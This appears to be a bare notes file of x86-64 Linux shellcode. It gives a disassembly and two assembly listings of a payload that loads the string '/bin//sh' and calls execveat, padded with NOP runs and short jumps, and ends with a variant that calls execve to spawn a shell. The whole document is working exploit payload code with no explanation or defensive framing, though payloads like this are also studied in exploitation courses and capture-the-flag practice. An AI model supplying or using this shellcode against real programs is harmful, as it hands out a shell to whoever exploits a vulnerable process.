0:  48 83 c4 50             add    rsp,0x50
4:  eb 0a                   jmp    10 <_main+0x10>
6:  90                      nop
7:  90                      nop
8:  90                      nop
9:  90                      nop
a:  90                      nop
b:  90                      nop
c:  90                      nop
d:  90                      nop
e:  90                      nop
f:  90                      nop
10: 6a 42                   push   0x42
12: 58                      pop    rax
13: fe c4                   inc    ah
15: 48 99                   cqo
17: 52                      push   rdx
18: eb 06                   jmp    20 <_main+0x20>
1a: 90                      nop
1b: 90                      nop
1c: 90                      nop
1d: 90                      nop
1e: 90                      nop
1f: 90                      nop
20: 49 89 d0                mov    r8,rdx
23: 49 89 d2                mov    r10,rdx
26: eb 08                   jmp    30 <_main+0x30>
28: 90                      nop
29: 90                      nop
2a: 90                      nop
2b: 90                      nop
2c: 90                      nop
2d: 90                      nop
2e: 90                      nop
2f: 90                      nop
30: 48 bf 2f 62 69 6e 2f    movabs rdi,0x68732f2f6e69622f
37: 2f 73 68
3a: eb 04                   jmp    40 <_main+0x40>
3c: 90                      nop
3d: 90                      nop
3e: 90                      nop
3f: 90                      nop
40: 57                      push   rdi
41: 54                      push   rsp
42: 5e                      pop    rsi
43: 0f 05                   syscall

# Adapt RSP
add rsp, 80
jmp    $+12
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push   0x42
pop    rax
inc    ah
cqo
push   rdx
jmp    $+8
nop
nop
nop
nop
nop
nop
mov    r8,rdx
mov    r10,rdx
jmp    $+10
nop
nop
nop
nop
nop
nop
nop
nop
movabs rdi,0x68732f2f6e69622f
jmp    $+6
nop
nop
nop
nop
push   rdi
push   rsp
pop    rsi
syscall


add rsp, 80
jmp    $+12
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push   0x42
pop    rax
inc    ah
cqo
push   rdx
jmp    $+8
nop
nop
nop
nop
nop
nop
mov    r8,rdx
mov    r10,rdx
jmp    $+10
nop
nop
nop
nop
nop
nop
nop
nop
movabs rdi,0x68732f2f6e69622f

jmp    $+6
nop
nop
nop
nop
push   rdi
push   rsp
pop    rsi
syscall

xor rdx, rdx
push rdx
; mov rax, 0x68732f2f6e69622f
push dword 0x6e69622f
mov dword [rsp+4], 0x68732f2f
pop rax
push rax
mov rdi, rsp
push rdx
push rdi
mov rsi, rsp
xor rax, rax
mov al, 0x3b
syscall